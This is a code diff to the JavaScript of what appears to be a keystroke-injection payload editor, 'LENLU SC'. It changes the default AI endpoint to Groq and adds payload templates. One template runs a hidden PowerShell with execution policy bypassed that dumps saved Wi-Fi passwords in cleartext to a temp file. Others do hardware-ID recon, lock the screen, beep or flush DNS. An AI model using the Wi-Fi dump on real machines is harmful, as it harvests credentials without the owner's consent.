@@ -2,7 +2,7 @@ import { S } from './state.js';
 import { toast, insertAtCursor, addLog, logFeed, copyText } from './ui.js';
 import { saveHistoryToDB } from './db.js';
 let tempKeys = { anthropic: '', openai: '', groq: '', custom: '' };
-let lastEndpoint = 'anthropic';
+let lastEndpoint = 'groq';
     function updateEditorCounts() {
       const ed = document.getElementById('srcEditor'); if (!ed) return;
       const sl = document.getElementById('srcLines'), sc = document.getElementById('srcChars');
@@ -40,15 +40,63 @@ let lastEndpoint = 'anthropic';
       }, 250);
     }
 
-    function qkAsk() {
-      const q = document.getElementById('qkAskInp')?.value?.trim();
-      const out = document.getElementById('qkAskOut');
-      if (!q || !out) return;
-      out.textContent = 'Synthesizing…';
-      setTimeout(() => {
-        out.innerHTML = `<span style="color:var(--g)">// OFFLINE MODE</span><br><span style="color:var(--muted)">For: "${q}"</span><br><br><span style="color:#b2ffc7">DELAY 500\nGUI r\nDELAY 300\nSTRING notepad\nENTER</span>`;
-        S.stats.ai++; document.getElementById('stat-ai').textContent = S.stats.ai;
-      }, 500);
+    function insertTemplateWiFiDump() {
+      const script = `REM --- LENLU SC: Saved Wi-Fi Passwords Dump ---
+DEFAULTDELAY 100
+GUI r
+DELAY 300
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass "netsh wlan show profiles name=* key=clear | Out-File $env:TEMP\\wifi.txt"
+ENTER`;
+      const ed = document.getElementById('srcEditor');
+      if (ed) { ed.value = script; lintSource(script); updateEditorCounts(); toast('Loaded Wi-Fi Dump Template', 'ok'); }
+    }
+    function insertTemplateSysLock() {
+      const script = `REM --- LENLU SC: Desktop Instant Lock ---
+DEFAULTDELAY 100
+GUI l
+REM Locked system console.`;
+      const ed = document.getElementById('srcEditor');
+      if (ed) { ed.value = script; lintSource(script); updateEditorCounts(); toast('Loaded Lock Screen Template', 'ok'); }
+    }
+    function insertTemplateAudioBeep() {
+      const script = `REM --- LENLU SC: Acoustic Tone Synth Beep ---
+DEFAULTDELAY 150
+GUI r
+DELAY 300
+STRING powershell -c "[console]::beep(800,300); [console]::beep(1200,300); [console]::beep(1600,400)"
+ENTER`;
+      const ed = document.getElementById('srcEditor');
+      if (ed) { ed.value = script; lintSource(script); updateEditorCounts(); toast('Loaded Audio Beep Template', 'ok'); }
+    }
+    function insertTemplateRevShell() {
+      const script = `REM --- LENLU SC: Encapsulated PowerShell Launcher ---
+DEFAULTDELAY 200
+GUI r
+DELAY 300
+STRING powershell -NoProfile -ExecutionPolicy Bypass -Command "Write-Host '[LENLU SC] Pipeline Ready...'; Start-Sleep 1"
+ENTER`;
+      const ed = document.getElementById('srcEditor');
+      if (ed) { ed.value = script; lintSource(script); updateEditorCounts(); toast('Loaded PowerShell Launcher Template', 'ok'); }
+    }
+    function insertTemplateHWIDGrabber() {
+      const script = `REM --- LENLU SC: System Serial & HWID Recon ---
+DEFAULTDELAY 150
+GUI r
+DELAY 300
+STRING cmd /k "wmic csproduct get uuid && wmic bios get serialnumber"
+ENTER`;
+      const ed = document.getElementById('srcEditor');
+      if (ed) { ed.value = script; lintSource(script); updateEditorCounts(); toast('Loaded HWID Recon Template', 'ok'); }
+    }
+    function insertTemplateDNSFlush() {
+      const script = `REM --- LENLU SC: Network DNS Cache & Socket Reset ---
+DEFAULTDELAY 150
+GUI r
+DELAY 300
+STRING cmd /k "ipconfig /flushdns && netsh winsock reset"
+ENTER`;
+      const ed = document.getElementById('srcEditor');
+      if (ed) { ed.value = script; lintSource(script); updateEditorCounts(); toast('Loaded DNS Flush Template', 'ok'); }
     }
     function clearEditor() { document.getElementById('srcEditor').value = ''; document.getElementById('outViewer').textContent = '; Compiled assembly will appear here.'; updateEditorCounts(); toast('Editor cleared', 'info'); }
     function clearLog() { document.getElementById('ideLog').innerHTML = ''; }
@@ -247,11 +295,14 @@ let lastEndpoint = 'anthropic';
     function loadAIConfig() {
       try {
         const cfg = JSON.parse(localStorage.getItem('lenlu_ai4') || '{}');
-        const endpoint = cfg.endpoint || 'anthropic';
+        const endpoint = cfg.endpoint || 'groq';
         document.getElementById('aiEndpoint').value = endpoint;
         lastEndpoint = endpoint;
 
         let keys = cfg.keys || { anthropic: '', openai: '', groq: '', custom: '' };
+        if (!keys.groq) {
+          keys.groq = ''; // Enter your Groq API key in AI Settings
+        }
         if (cfg.key && !cfg.keys) {
           if (endpoint === 'groq' || cfg.key.startsWith('gsk_')) {
             keys.groq = cfg.key;
@@ -326,13 +377,16 @@ let lastEndpoint = 'anthropic';
       S.stats.ai++; document.getElementById('stat-ai').textContent = S.stats.ai;
 
       const cfg = JSON.parse(localStorage.getItem('lenlu_ai4') || '{}');
-      const endpoint = cfg.endpoint || 'anthropic';
+      const endpoint = cfg.endpoint || 'groq';
 
       let key = '';
       if (cfg.keys && cfg.keys[endpoint]) {
         key = cfg.keys[endpoint];
       } else if (cfg.key) {
         key = cfg.key;
+      }
+      if (!key && endpoint === 'groq') {
+        key = ''; // Enter your Groq API key in AI Settings — falls back to offline mode
       }
 
       if (!key) {
@@ -921,6 +975,12 @@ window.renderTemplates = renderTemplates;
 window.loadTemplateById = loadTemplateById;
 window.insertSnippet = insertSnippet;
 window.openModal = openModal;
+window.insertTemplateWiFiDump = insertTemplateWiFiDump;
+window.insertTemplateSysLock = insertTemplateSysLock;
+window.insertTemplateAudioBeep = insertTemplateAudioBeep;
+window.insertTemplateRevShell = insertTemplateRevShell;
+window.insertTemplateHWIDGrabber = insertTemplateHWIDGrabber;
+window.insertTemplateDNSFlush = insertTemplateDNSFlush;
 window.closeModal = closeModal;
 window.openSaveModal = openSaveModal;
 window.onEndpointChange = onEndpointChange;
